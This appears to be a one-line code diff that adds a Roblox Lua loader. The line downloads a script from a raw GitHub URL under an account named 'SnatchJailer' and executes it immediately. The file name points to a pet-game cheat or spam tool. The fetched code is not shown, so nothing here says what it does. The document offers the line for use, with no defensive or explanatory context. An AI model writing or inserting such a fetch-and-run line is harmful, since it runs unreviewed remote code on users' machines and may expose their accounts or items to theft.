@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/30m-pets-universe-spam4-9n0ekzougx5ckz.lua"))()
